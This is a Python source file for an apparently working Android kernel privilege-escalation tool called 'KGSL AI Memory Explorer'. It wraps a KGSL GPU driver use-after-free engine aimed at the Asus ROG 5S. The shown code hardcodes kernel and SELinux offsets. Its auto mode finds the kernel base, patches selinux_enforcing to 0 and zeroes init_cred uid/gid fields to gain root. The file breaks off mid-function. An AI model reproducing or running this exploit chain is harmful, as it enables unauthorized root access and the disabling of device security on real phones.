#!/usr/bin/env python3
"""
KGSL AI Memory Explorer - ROG 5S Optimized
Live TUI with ANSI colors, background learning, Ctrl+P cancel, spray logging.
"""

import os
import sys
import time
import struct
import subprocess
import threading
import json
import select
import termios
import tty
import datetime
import fcntl
import ctypes

# Portable memmem() for Python (find needle in haystack)
def memmem(haystack, haystack_len, needle, needle_len):
    if needle_len == 0 or haystack_len < needle_len:
        return None
    end = haystack_len - needle_len
    for i in range(end + 1):
        if haystack[i:i+needle_len] == needle:
            return i
    return None

# ============== ANSI COLORS ==============
class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    GRN   = "\033[92m"
    YEL   = "\033[93m"
    BLU   = "\033[94m"
    MAG   = "\033[95m"
    CYN   = "\033[96m"
    WHT   = "\033[97m"
    GRY   = "\033[90m"
    BG_BLK= "\033[40m"
    INV   = "\033[7m"
    CLR   = "\033[2J\033[H"  # clear + cursor home
    HIDE  = "\033[?25l"
    SHOW  = "\033[?25h"

# Particle animation frames (used in header / status to show liveness)
PARTICLES = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
SPRAY_PARTICLES = ["◐","◓","◑","◒"]

# ============== EXPLORER ==============
class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.spray_log = []  # detailed log of every spray
        self.exploit_proc = None
        self.kb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "knowledge_base.json")
        self.log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "explorer_log.jsonl")
        self.knowledge_base = self.load_kb()

        # Live status state (updated by background threads)
        self.live = {
            "ram": 0.0,
            "status": "IDLE",
            "ai_patterns": self.knowledge_base.get("hit_count", 0),
            "last_msg": "Engine Ready.",
            "scan_offset": 0,
            "scan_total": 0,
            "spray_count": 0,
            "spray_target": 0,
            "kill_count": 0,
            "engine_pid": 0,
            "uptime_start": time.time(),
            "last_command": "—",
            "particle_idx": 0,
            "spray_pulse": 0,
            "last_spray_ts": 0.0,
            "sprays_per_sec": 0.0,
        }

        # Command history (for Up/Down rewind)
        self.cmd_history = []
        self.cmd_hist_idx = 0
        self.last_cmd_text = ""

        # Render lock — auto-render thread and input thread share the TUI
        self.render_lock = threading.Lock()

        # Per-op busy flags (so TUI shows "EXPLOITING…" / "SCANNING…")
        self.op_busy = {"exploit": False, "scan": False}
        self.op_results = {"exploit": None, "scan": None}

        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")

        self.uaf_start = 0x7001ff000
        self.scan_size  = 0x2000000

        # Offsets from v6.c reference (ROG 5S, kernel 5.4, AArch64)
        self.cred_offset  = 0x770            # task_struct.cred
        self.comm_offset  = 0x718            # task_struct.comm
        self.real_cred_offset = 0x768
        # Kernel base candidates (from v6.c)
        self.kernel_base_candidates = [
            0xffffffc000000000, 0xffffffc010000000, 0xffffffc020000000,
            0xffffffc030000000, 0xffffffc035000000, 0xffffffc040000000,
            0xffffffc008200000, 0xffffffb000000000, 0xffffffa000000000,
            0xffffffaf00000000, 0xffffffaf20000000, 0xffffff9550000000,
            0xffffff94d0000000, 0xffffff8e70000000,
        ]
        # SELinux enforcing offsets (from v6.c candidates)
        self.selinux_offset_candidates = [
            0x02caa000, 0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x3709ce8,
            0x3b3ace8, 0x3b84ce8, 0x3cf4ce8, 0x3d34ce8, 0x3d44ce8,
            0x3df4ce8, 0x3e34ce8, 0x3e54ce8, 0x3eb4ce8, 0x3f04ce8,
        ]
        self.init_cred_offset = 0x018f9038
        self.kernel_base = None
        self.selinux_va  = None
        self.cred_va     = None
        self.auto_mode   = True    # pressing E auto-runs full pipeline

        # Cancel flag for background operations
        self.cancel_flag = threading.Event()
        self.bg_thread = None
        self.bg_lock = threading.Lock()

        # Heuristics
        self.system_apps = {
            "com.android.settings": "System Settings (Developer Mode)",
            "com.android.systemui": "System UI (Status Bar/Home)",
            "com.android.camera": "Camera Driver Context",
            "com.android.gallery3d": "Gallery/Media Provider",
            "com.android.deskclock": "System Clock/Alarms",
            "com.android.contacts": "Contacts/Phonebook",
            "com.google.android.gms": "Google Play Services",
            "com.asus.launcher": "ASUS Launcher",
            "android.uid.system": "System UID Context (UID 1000)",
        }
        self.kernel_structures = {
            b"KETO0422": "task_struct (Active Process Marker)",
            b"init_cred": "Kernel Root Credentials (Global)",
            b"selinux_enforcing": "SELinux Status Bit",
            b"\x7f" + b"ELF": "Kernel Executable Header (Base)",
            b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue (Code)",
        }
        self.offsets = {"pid": 0x548, "comm": 0x718, "cred": 0x770, "real_cred": 0x768, "tasks": 0x3f0}

        # Start live updater
        self._stop_live = threading.Event()
        threading.Thread(target=self._live_updater, daemon=True).start()
        # Start auto renderer (updates TUI every 0.3s without user input)
        threading.Thread(target=self._auto_renderer, daemon=True).start()

    # ============== KNOWLEDGE BASE ==============
    def load_kb(self):
        if os.path.exists(self.kb_path):
            try:
                with open(self.kb_path, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return {"successful_vas": [], "hit_count": 0, "ranges": []}

    def save_kb(self):
        with open(self.kb_path, 'w') as f:
            json.dump(self.knowledge_base, f, indent=4)

    # ============== LOGGING ==============
    def log_event(self, event_type, data):
        """Append event to global JSONL log. Called by spray + scan + patch."""
        entry = {
            "ts": datetime.datetime.now().isoformat(),
            "type": event_type,
            **data,
        }
        try:
            with open(self.log_path, 'a') as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            pass
        # mirror short events in spray_log
        if event_type in ("spray", "kill", "scan_match", "patch"):
            self.spray_log.append(entry)

    # ============== AI CLASSIFIER ==============
    def classify_page(self, page_data, va, sig=0, off_in_page=-1):
        """Classify a found memory page. sig comes from the C engine
        (1=task_struct with KETO0422, 2=system app, 3=kernel ELF, 4=init_cred,
         6=cred pointer). 100% when sig>0. SELinux is no longer found by
        random scan — it must be probed via _probe_selinux (known offset)."""
        # 1. task_struct with KETO0422 comm (from spray) — this is 100% a task_struct
        if sig == 1:
            cred_va = va + (self.cred_offset - off_in_page)
            return {
                "type": "Privilege Struct",
                "description": f"task_struct (KETO0422 comm @ 0x{off_in_page:x}) — cred @ {cred_va:#x}",
                "va": hex(va),
                "confidence": 100,
                "data": page_data,
            }
        # 2. system app string — 100% it's a system app
        if sig == 2:
            name = b"com.android."
            idx = page_data.find(name)
            app = page_data[idx:idx+64].split(b"\x00")[0].decode(errors="ignore") if idx >= 0 else "?"
            return {"type": "System App", "description": app, "va": hex(va),
                    "confidence": 100, "data": page_data}
        # 3. kernel ELF — 100% it's the kernel base
        if sig == 3:
            return {"type": "Kernel Code", "description": "Kernel ELF header (100% kernel base)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 4. init_cred string — 100% init_cred struct
        if sig == 4:
            return {"type": "Privilege Struct", "description": "init_cred (100% cred)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 6. cred pointer — 100% it's a task_struct cred field
        if sig == 6:
            cred_va = va + off_in_page
            return {"type": "Privilege Struct",
                    "description": f"cred pointer @ 0x{off_in_page:x} (100% task_struct.cred)",
                    "va": hex(va), "confidence": 100, "data": page_data}

        # Fallback heuristic classification (no sig from engine)
        # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
        idx = page_data.find(b"KETO0422")
        if idx >= 0:
            # If we got a task_struct without sig (shouldn't happen), still mark 100%
            cred_va = va + (self.cred_offset - idx) if idx >= 0 else 0
            return {"type": "Privilege Struct",
                    "description": f"task_struct (KETO0422) cred @ {cred_va:#x}",
                    "va": hex(va), "confidence": 100, "data": page_data}
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                return {"type": "System App", "description": name, "va": hex(va),
                        "confidence": 80, "data": page_data}
        for sig_b, name in self.kernel_structures.items():
            if sig_b in page_data:
                if hex(va) not in self.knowledge_base["successful_vas"]:
                    self.knowledge_base["successful_vas"].append(hex(va))
                    self.knowledge_base["hit_count"] += 1
                    self.save_kb()
                return {"type": "Kernel Core", "description": name, "va": hex(va),
                        "confidence": 70, "data": page_data}
        uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
        if uid_pattern in page_data:
            return {"type": "Privilege Struct", "description": "CRED for UID 10237",
                    "va": hex(va), "confidence": 60, "data": page_data}
        sys_uid = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if sys_uid in page_data:
            return {"type": "Privilege Struct", "description": "System UID (1000)",
                    "va": hex(va), "confidence": 60, "data": page_data}
        if b"\x00\x00\x00\x94" in page_data:
            return {"type": "Kernel Code", "description": "Executable AArch64 Segment",
                    "va": hex(va), "confidence": 60, "data": page_data}
        return {"type": "Unknown Object", "description": "Unclassified Data Fragment",
                "va": hex(va), "confidence": 10, "data": page_data}

    def translate_logic(self, item):
        data = item['data']
        desc = item['description']
        if "task_struct" in desc or b"KETO" in data:
            try:
                pid = struct.unpack("<I", data[self.offsets["pid"]:self.offsets["pid"]+4])[0]
                comm = data[self.offsets["comm"]:self.offsets["comm"]+16].split(b"\x00")[0].decode(errors='ignore')
            except Exception:
                pid, comm = 0, "unknown"
            return f"Process Descriptor for '{comm}' (PID {pid})"
        if "SELinux" in desc:
            return "Global SELinux configuration bit."
        if "Settings" in desc:
            return "Android Settings process memory."
        if "CRED" in desc:
            return "Credential structure. Holds UID/GID. Target for Root."
        return "Generic data buffer."

    # ============== LIVE UPDATER ==============
    def _live_updater(self):
        last_spray_count = 0
        last_t = time.time()
        while not self._stop_live.is_set():
            now = time.time()
            self.live["ram"] = self.get_ram_usage()
            self.live["ai_patterns"] = self.knowledge_base.get("hit_count", 0)

            # Status reflects engine + per-op busy state
            if self.op_busy.get("exploit"):
                self.live["status"] = "EXPLOITING…"
            elif self.op_busy.get("scan"):
                self.live["status"] = "SCANNING…"
            elif self.exploit_proc and self.exploit_proc.poll() is None:
                self.live["status"] = "EXPLOIT ACTIVE"
                self.live["engine_pid"] = self.exploit_proc.pid
            else:
                self.live["status"] = "IDLE"
                self.live["engine_pid"] = 0

            # Particle index for animation
            self.live["particle_idx"] = (self.live["particle_idx"] + 1) % len(PARTICLES)
            # Spray pulse: rate of sprays per second
            if self.live["spray_count"] != last_spray_count:
                dt = max(0.001, now - last_t)
                self.live["sprays_per_sec"] = (self.live["spray_count"] - last_spray_count) / dt
                last_spray_count = self.live["spray_count"]
                self.live["last_spray_ts"] = now
                self.live["spray_pulse"] = (self.live["spray_pulse"] + 1) % len(SPRAY_PARTICLES)
                last_t = now

            time.sleep(0.2)

    # ============== AUTO RENDERER (redraws TUI without waiting for input) ==============
    def _auto_renderer(self):
        """Continuously redraws the TUI every 0.3s, independent of user input.
        This makes all live values (RAM, AI, spray, scan, particles) update
        online without the user having to press anything."""
        while not self._stop_live.is_set():
            time.sleep(0.3)
            try:
                # Skip if user is currently typing at the prompt
                if getattr(self, "is_reading_input", False):
                    continue
                # Only redraw if we can grab the lock (don't block input).
                if self.render_lock.acquire(blocking=False):
                    self.render_tui()
                    self.render_lock.release()
            except Exception:
                pass

    # ============== TUI ==============
    def render_tui(self, hint=""):
        with self.render_lock:
            out = []
            L = self.live
            up = int(time.time() - L["uptime_start"])
            m, s = divmod(up, 60)
            h, m = divmod(m, 60)

            # Header with particle animation
            pi = L["particle_idx"] % len(PARTICLES)
            sp = L["spray_pulse"] % len(SPRAY_PARTICLES)
            particle = PARTICLES[pi]
            spray_p  = SPRAY_PARTICLES[sp]
            out.append(f"{C.BG_BLK}{C.CYN}{C.BOLD} {particle} KGSL AI MEMORY EXPLORER  v3.1  {C.RST}"
                       f"{C.GRY} │ {C.WHT}Asus ROG 5S  {C.GRY}│{C.RST}"
                       f" Up {C.GRN}{h:02d}:{m:02d}:{s:02d}{C.RST}  {C.GRY}│{C.RST}  "
                       f"{C.MAG}{spray_p}{C.RST}")

            # Live status — split into two visual lines for clarity
            ram_color = C.GRN if L["ram"] < 50 else (C.YEL if L["ram"] < 75 else C.RED)
            st_color  = C.GRN if "ACTIVE" in L["status"] else C.GRY
            out.append(f" {C.BOLD}STATUS{C.RST}: {st_color}{L['status']:<14}{C.RST}"
                       f" {C.GRY}│{C.RST} {C.BOLD}RAM{C.RST}: {ram_color}{L['ram']:5.1f}%{C.RST}"
                       f" {C.GRY}│{C.RST} {C.BOLD}AI LEARNING{C.RST}: {C.MAG}{L['ai_patterns']:>4}{C.RST} patterns"
                       f" {C.GRY}│{C.RST} {C.BOLD}ENGINE{C.RST}: {C.CYN}{L['engine_pid']:>6}{C.RST}"
                       f" {C.GRY}│{C.RST} {C.BOLD}SPRAY/s{C.RST}: {C.YEL}{L['sprays_per_sec']:5.1f}{C.RST}")

            # Last message (continuously updated online)
            out.append(f" {C.BOLD}LAST MSG{C.RST}: {C.YEL}{L['last_msg'][:70]}{C.RST}")

            # Live scan/spray progress bars
            if L["scan_total"] > 0 or L["spray_target"] > 0:
                if L["spray_target"] > 0:
                    pct = min(100, 100 * L["spray_count"] // max(1, L["spray_target"]))
                    bar = self._bar(pct, 32, C.CYN)
                    out.append(f" {C.BOLD}SPRAY {C.RST}{spray_p} {bar} {pct:3d}%  "
                               f"({L['spray_count']}/{L['spray_target']})  "
                               f"{C.GRY}kills:{L['kill_count']}{C.RST}")
                if L["scan_total"] > 0:
                    pct = min(100, 100 * L["scan_offset"] // max(1, L["scan_total"]))
                    bar = self._bar(pct, 32, C.YEL)
                    out.append(f" {C.BOLD}SCAN  {C.RST}  {bar} {pct:3d}%  "
                               f"({L['scan_offset']:#x}/{L['scan_total']:#x})")

            out.append(f"{C.GRY}{'─'*92}{C.RST}")

            # Found items (file manager)
            out.append(f" {C.BOLD}{C.WHT}[FILE MANAGER VIEW] — Found Memory Offsets  "
                       f"{C.GRY}({len(self.found_items)} total){C.RST}")
            out.append(f"{C.GRY}{'─'*92}{C.RST}")
            if not self.found_items:
                out.append(f" {C.GRY}(No items yet — press {C.WHT}[E]{C.GRY} to exploit, "
                           f"{C.WHT}[L]{C.GRY} to learn, {C.WHT}[S]{C.GRY} to scan){C.RST}")
            else:
                display = self.found_items[-12:]
                for i, item in enumerate(display):
                    idx = len(self.found_items) - len(display) + i
                    color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
                             "System App": C.BLU, "Kernel Code": C.MAG}.get(item['type'], C.GRY)
                    out.append(f" {C.GRY}└──{C.RST} {C.BOLD}{color}[{idx:02d}]{C.RST} "
                               f"{color}{item['type']:<18}{C.RST} │ "
                               f"{C.WHT}{item['description'][:40]:<40}{C.RST} │ "
                               f"{C.CYN}{item['va']}{C.RST}")

            out.append(f"{C.GRY}{'─'*92}{C.RST}")

            # Color-coded menu (E, L, S = GREEN 1st/2nd/3rd; C, R, B, Q, ID = BLUE neutral)
            out.append(
                f" {C.GRN}[E]{C.RST} Exploit Trigger   "
                f"{C.GRN}[L]{C.RST} AI Learning Loop  "
                f"{C.GRN}[S]{C.RST} Start AI Scan     "
                f"{C.BLU}[C]{C.RST} Clear Memory"
            )
            out.append(
                f" {C.BLU}[R]{C.RST} Verify Root       "
                f"{C.BLU}[B]{C.RST} Rebuild Engine    "
                f"{C.BLU}[Q]{C.RST} Exit Explorer     "
                f"{C.BLU}[ID]{C.RST} Open File"
            )
            out.append(f"{C.GRY}{'─'*92}{C.RST}")

            # Spray log activity (recent 3 lines)
            if self.spray_log:
                out.append(f" {C.BOLD}{C.MAG}LIVE LOG STREAM{C.RST} {C.GRY}(last 3){C.RST}")
                for e in self.spray_log[-3:]:
                    et = e.get("type", "?")
                    if et == "spray":
                        out.append(f"  {C.CYN}▸{C.RST} SPRAY  pid={C.WHT}{e.get('pid',0):<6}{C.RST} "
                                   f"name={C.YEL}{e.get('name','?'):<14}{C.RST} "
                                   f"batch={C.GRY}{e.get('batch',0)}{C.RST}")
                    elif et == "kill":
                        out.append(f"  {C.RED}✗{C.RST} KILL   pid={C.WHT}{e.get('pid',0)}{C.RST}")
                    elif et == "scan_match":
                        out.append(f"  {C.GRN}✓{C.RST} MATCH  va={C.CYN}{hex(e.get('va',0)):<14}{C.RST} "
                                   f"type={C.MAG}{e.get('type','?')}{C.RST}")
                    elif et == "patch":
                        out.append(f"  {C.YEL}⚡{C.RST} PATCH  va={C.CYN}{e.get('va','?')}{C.RST} "
                                   f"val={e.get('val','?')} → {e.get('result','?')}")
                out.append(f"{C.GRY}{'─'*92}{C.RST}")

            # Hint + last command (rewind hint)
            if hint:
                out.append(f" {C.MAG}HINT{C.RST}: {C.WHT}{hint}{C.RST}")
            out.append(f" {C.GRY}LAST CMD{C.RST}: {C.CYN}{L['last_command']}{C.RST}    "
                       f"{C.GRY}(↑/↓ history, Ctrl+E rewind, Ctrl+P stop 'L', 'log' to dump){C.RST}")

            # Render atomically
            try:
                sys.stdout.write(C.CLR + "\n".join(out) + "\n")
                sys.stdout.flush()
            except Exception:
                pass

    def _bar(self, pct, width, color):
        filled = int(width * pct / 100)
        return f"{C.GRY}[{color}{'█' * filled}{'░' * (width - filled)}{C.GRY}]{C.RST}"

    # ============== ENGINE MANAGEMENT ==============
    def ensure_engine(self):
        if self.exploit_proc:
            if self.exploit_proc.poll() is None:
                return True
            else:
                try:
                    err = self.exploit_proc.stderr.read().decode()
                except Exception:
                    err = ""
                self.live["last_msg"] = f"Engine died: {err.strip()[:80]}"
                self.log_event("engine_died", {"code": self.exploit_proc.returncode, "err": err})
                self.exploit_proc = None

        # Check format / missing
        if os.path.exists(self.engine_path):
            try:
                with open(self.engine_path, "rb") as f:
                    head = f.read(4)
                if head[:4] != b"\x7fELF":
                    self.try_compile_engine()
            except Exception:
                self.try_compile_engine()
        else:
            self.try_compile_engine()

        try:
            self.exploit_proc = subprocess.Popen(
                [self.engine_path],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, text=False, bufsize=0,
            )
            self.live["last_msg"] = f"Engine started (pid={self.exploit_proc.pid})"
            self.log_event("engine_start", {"pid": self.exploit_proc.pid})
            return True
        except Exception as e:
            self.live["last_msg"] = f"Engine start failed: {e}"
            return False

    def try_compile_engine(self):
        src = self.engine_path + ".c"
        if not os.path.exists(src):
            return False
        for comp in ("gcc", "clang"):
            try:
                subprocess.check_call([comp, "-O2", src, "-o", self.engine_path, "-lpthread"])
                return True
            except Exception:
                continue
        return False

    def _read_data_packet(self):
        if not self._engine_alive():
            return None
        try:
            # Wait briefly for the DATA: line
            line = self._readline_timeout(timeout=2.0)
            if not line or not line.startswith("DATA:"):
                return None
            _, va_s, size_s = line.split(":")
            va = int(va_s, 16)
            size = int(size_s)
            # Read raw bytes
            data = b""
            while len(data) < size:
                if not self._engine_alive():
                    return None
                r, _, _ = select.select([self.exploit_proc.stdout], [], [], 2.0)
                if not r:
                    break
                chunk = self.exploit_proc.stdout.read(size - len(data))
                if not chunk:
                    break
                data += chunk
            # Consume DATA_END line
            self._readline_timeout(timeout=0.5)
            return data
        except Exception as e:
            self.live["last_msg"] = f"Read packet error: {e}"
            self.log_event("engine_error", {"op": "read_packet", "err": str(e)})
            return None

    def _engine_alive(self):
        return self.exploit_proc is not None and self.exploit_proc.poll() is None

    def _engine_write(self, data):
        """Write to engine stdin, restarting it on BrokenPipe."""
        if not self.ensure_engine():
            return False
        try:
            self.exploit_proc.stdin.write(data)
            self.exploit_proc.stdin.flush()
            return True
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            self.live["last_msg"] = f"Pipe broken: {e} — restarting engine"
            self.log_event("engine_pipe_broken", {"err": str(e)})
            self.exploit_proc = None
            if self.ensure_engine():
                try:
                    self.exploit_proc.stdin.write(data)
                    self.exploit_proc.stdin.flush()
                    return True
                except Exception as e2:
                    self.log_event("engine_restart_fail", {"err": str(e2)})
            return False

    def read_page(self, va):
        if not self._engine_write(f"read {hex(va)}\n".encode()):
            return None
        return self._read_data_packet()

    def patch_mem(self, va, val):
        if not self._engine_write(f"patch {hex(va)} {hex(val)}\n".encode()):
            return "Engine Error"
        try:
            line = self._readline_timeout(timeout=2.0) or ""
            self.log_event("patch", {"va": hex(va), "val": hex(val), "result": line})
            return line
        except Exception as e:
            return str(e)

    def _add_found(self, va, type, desc, confidence):
        """Add a found item to the TUI list (idempotent by va)."""
        with self.bg_lock:
            for it in self.found_items:
                if it["va"] == va:
                    # upgrade confidence if higher
                    if confidence > it.get("confidence", 0):
                        it["confidence"] = confidence
                        it["type"] = type
                        it["description"] = desc
                    return
            self.found_items.append({
                "va": va,
                "type": type,
                "description": desc,
                "confidence": confidence,
                "ts": datetime.datetime.now().isoformat(),
            })
            # Save to knowledge base
            self.knowledge_base.setdefault("successful_vas", []).append(va)
            self.knowledge_base["hit_count"] = self.knowledge_base.get("hit_count", 0) + 1
            try:
                with open(self.kb_path, 'w') as f:
                    json.dump(self.knowledge_base, f, indent=2)
            except Exception:
                pass
            self.log_event("found", {"va": va, "type": type, "desc": desc,
                                      "confidence": confidence})

    def _find_kernel_base(self):
        """Try the engine's kbase command, then fall back to probing candidates."""
        if self._engine_write(b"kbase\n"):
            deadline = time.time() + 30
            while time.time() < deadline:
                line = self._readline_timeout(timeout=1.0)
                if not line:
                    continue
                if line.startswith("KBASE:"):
                    return int(line.split(":")[1], 16)
                if "KBASE_FAILED" in line:
                    break
                if line is None:
                    break
        # Fallback: read 4 bytes at each candidate and look for ELF magic
        for base in self.kernel_base_candidates:
            data = self.read_page(base)
            if data and len(data) >= 4:
                if data[0:4] == b"\x7fELF":
                    return base
        return None

    def _probe_selinux(self, kbase):
        """Strict SELinux enforcing probe: try known offsets, verify via engine
        'selinux' command (3 reads, must be stable 0 or 1)."""
        for off in self.selinux_offset_candidates:
            va = kbase + off
            if not self._engine_write(f"selinux {hex(va)}\n".encode()):
                continue
            deadline = time.time() + 5
            while time.time() < deadline:
                line = self._readline_timeout(timeout=1.0)
                if not line:
                    continue
                if line.startswith("SELINUX:OK:") and ":stable" in line:
                    parts = line.split(":")
                    # SELINUX:OK:<va>:<val>:stable
                    val = int(parts[3])
                    return (va, val)
                if line.startswith("SELINUX:"):
                    # READ_FAIL / UNSTABLE / FAIL — try next offset
                    break
                if line is None:
                    break
        return None

    def _verify_init_cred(self, va):
        """Use engine 'cred' command to verify init_cred at va."""
        if not self._engine_write(f"cred {hex(va)}\n".encode()):
            return None
        deadline = time.time() + 5
        while time.time() < deadline:
            line = self._readline_timeout(timeout=1.0)
            if not line:
                continue
            if line.startswith("CRED:OK:") and ":root" in line:
                return "root"
            if line.startswith("CRED:OK:"):
                return "valid"
            if line.startswith("CRED:"):
                return None
            if line is None:
                return None
        return None

    def _find_init_cred(self, kbase):
        """init_cred is at kbase + INIT_CRED_OFFSET. Returns VA if verified, else kbase+offset."""
        va = kbase + self.init_cred_offset
        result = self._verify_init_cred(va)
        if result is not None:
            return va
        # Try alternate offsets
        for off in (0x018f9038, 0x018a5038, 0x01973038, 0x01939038):
            alt = kbase + off
            if self._verify_init_cred(alt) is not None:
                return alt
        return None

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                avail  = int(lines[2].split()[1])
                return 100.0 * (1 - avail / total)
        except Exception:
            return 0.0

    def _set_comm(self, name):
        """Set this process comm (visible in /proc/[pid]/comm) to `name`."""
        try:
            import ctypes
            libc = ctypes.CDLL(None)
            PR_SET_NAME = 15
            libc.prctl(PR_SET_NAME, name.encode(), 0, 0, 0)
        except Exception:
            pass

    def _readline_timeout(self, timeout=2.0):
        """Non-blocking-ish read of one line from the engine (with select timeout).
        Returns:
            ""  -> timeout (no data available)
            None -> engine died / EOF
            str  -> the line read (already stripped)"""
        if not self.exploit_proc or self.exploit_proc.poll() is not None:
            return None
        try:
            fd = self.exploit_proc.stdout.fileno()
            r, _, _ = select.select([fd], [], [], timeout)
            if not r:
                return ""
            line = self.exploit_proc.stdout.readline()
            if not line:
                return None
            return line.decode(errors="ignore").strip()
        except Exception:
            return None

    # ============== ACTIONS ==============
    def trigger_exploit(self):
        """Trigger the KGSL UAF. In auto_mode, also chains: kbase → selinux → cred → patch.
        Runs in a worker thread so the TUI never freezes."""
        self.live["last_command"] = "E (Exploit)"
        if self.op_busy["exploit"]:
            self.live["last_msg"] = "Exploit already running…"
            return "Busy"
        if not self._engine_write(b"exploit\n"):
            return "Engine Error"

        self.op_busy["exploit"] = True
        self.live["last_msg"] = "EXPLOITING…"

        def _worker():
            try:
                # Poll the engine for "UAF_READY" / "UAF_FAILED"
                deadline = time.time() + 30
                last_line = ""
                while time.time() < deadline:
                    line = self._readline_timeout(timeout=0.5)
                    if line is None:
                        self.op_results["exploit"] = "Engine died during exploit"
                        break
                    if not line:
                        continue
                    last_line = line
                    if "UAF_READY" in line or "UAF_FAILED" in line:
                        self.op_results["exploit"] = line
                        break
                else:
                    self.op_results["exploit"] = f"Exploit timeout: {last_line or 'no response'}"
                self.live["last_msg"] = f"Exploit: {self.op_results['exploit']}"
                self.log_event("exploit", {"result": self.op_results['exploit']})

                if "UAF_READY" not in (self.op_results["exploit"] or ""):
                    return

                # Auto-mode: chain through kbase → selinux → cred → patch
                if not self.auto_mode:
                    return

                self.live["last_msg"] = "AUTO: finding kernel base…"
                kbase = self._find_kernel_base()
                if kbase is None:
                    self.live["last_msg"] = "AUTO: kernel base not found"
                    self.log_event("auto_kbase_fail", {})
                    return
                self.kernel_base = kbase
                self.log_event("auto_kbase", {"kbase": hex(kbase)})
                self._add_found(
                    va=hex(kbase),
                    type="Kernel Code",
                    desc="Kernel ELF base (auto)",
                    confidence=100,
                )

                self.live["last_msg"] = f"AUTO: kernel base=0x{kbase:x}, probing SELinux…"
                sel = self._probe_selinux(kbase)
                if sel is not None:
                    sel_va, val = sel
                    self.selinux_va = sel_va
                    self.log_event("auto_selinux", {"va": hex(sel_va), "val": val})
                    self._add_found(
                        va=hex(sel_va),
                        type="SELinux",
                        desc=f"selinux_enforcing={val} (verified stable)",
                        confidence=100,
                    )
                    # Patch SELinux enforcing -> 0 (disable)
                    self.live["last_msg"] = f"AUTO: patching SELinux {sel_va:#x} -> 0…"
                    res = self.patch_mem(sel_va, 0)
                    self.log_event("auto_selinux_patch", {"va": hex(sel_va), "result": res})
                    self._add_found(
                        va=hex(sel_va),
                        type="SELinux (PATCHED)",
                        desc=f"selinux_enforcing=0 (was {val}, verified)",
                        confidence=100,
                    )
                else:
                    self.live["last_msg"] = "AUTO: SELinux NOT verified (no stable value at known offsets)"
                    self.log_event("auto_selinux_fail", {"kbase": hex(kbase)})

                self.live["last_msg"] = f"AUTO: locating init_cred @ 0x{self.init_cred_offset:x}…"
                ic = self._find_init_cred(kbase)
                if ic is not None:
                    self.cred_va = ic
                    cred_verify = self._verify_init_cred(ic)
                    self.log_event("auto_init_cred", {"va": hex(ic), "verify": cred_verify})
                    self._add_found(
                        va=hex(ic),
                        type="Privilege Struct",
                        desc=f"init_cred (verified={cred_verify})",
                        confidence=100,
                    )
                    # Patch init_cred uid/gid/euid/egid to 0 (root)
                    for off in (4, 8, 12, 16, 20, 24):
                        self.patch_mem(ic + off, 0)
                    self._add_found(
                        va=hex(ic),
                        type="Privilege Struct (ROOTED)",
                        desc=f"init_cred uid/gid=0 (verified={cred_verify})",
                        confidence=100,
                    )
                else:
                    self.live["last_msg"] = "AUTO: init_cred NOT verified (no cred struct at known offsets)"
                    self.log_event("auto_init_cred_fail", {"kbase": hex(kbase)})

                sel_str = f"0x{sel[0]:x}" if sel else "N/A"
                ic_str  = f"0x{ic:x}" if ic else "N/A"
                self.live["last_msg"] = (
                    f"AUTO DONE: kbase=0x{kbase:x} selinux={sel_str} cred={ic_str}")
            except Exception as e:
                self.live["last_msg"] = f"Exploit error: {e}"
                self.log_event("exploit_error", {"err": str(e)})
            finally:
                self.op_busy["exploit"] = False

        threading.Thread(target=_worker, daemon=True).start()
        return "Exploit started"

    def cmd_clear(self):
        self.live["last_command"] = "C (Clear)"
        for pid in list(self.spray_procs):
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
            except Exception:
                pass
        self.spray_procs.clear()
        self.live["kill_count"] += 1
        self.live["last_msg"] = "Memory Cleared."
        return "Cleared"

    def cmd_rebuild(self):
        self.live["last_command"] = "B (Rebuild)"
        ok = self.try_compile_engine()
        if ok and self.exploit_proc:
            try:
                self.exploit_proc.stdin.write(b"quit\n")
                self.exploit_proc.terminate()
            except Exception:
                pass
            self.exploit_proc = None
        self.live["last_msg"] = "Engine Rebuilt." if ok else "Rebuild Failed."
        return "Rebuilt" if ok else "Failed"

    def cmd_verify_root(self):
        self.live["last_command"] = "R (Verify Root)"
        try:
            res = subprocess.check_output(["id"], text=True).strip()
        except Exception:
            res = "id failed"
        self.live["last_msg"] = res
        return res

    def cmd_scan(self):
        """Synchronous scan, but with live progress bar updates."""
        self.live["last_command"] = "S (Scan)"
        if self.op_busy["scan"]:
            self.live["last_msg"] = "Scan already running…"
            return "Busy"
        if not self.ensure_engine():
            return "Engine Error"

        self.op_busy["scan"] = True
        self.live["scan_total"] = self.scan_size
        self.live["scan_offset"] = 0
        self.live["last_msg"] = "SCANNING…"

        def _scan_worker():
            try:
                # Prioritize known ranges (these are quick page reads)
                for va_hex in list(self.knowledge_base["successful_vas"])[:8]:
                    if self.cancel_flag.is_set():
                        return
                    va = int(va_hex, 16)
                    data = self.read_page(va)
                    if data and not any(int(it['va'], 16) == va for it in self.found_items):
                        with self.bg_lock:
                            self.found_items.append(self.classify_page(data, va))

                if not self._engine_write(
                    f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
                    self.live["last_msg"] = "Scan: engine write failed"
                    return

                # Use bounded readline timeouts so we never block forever
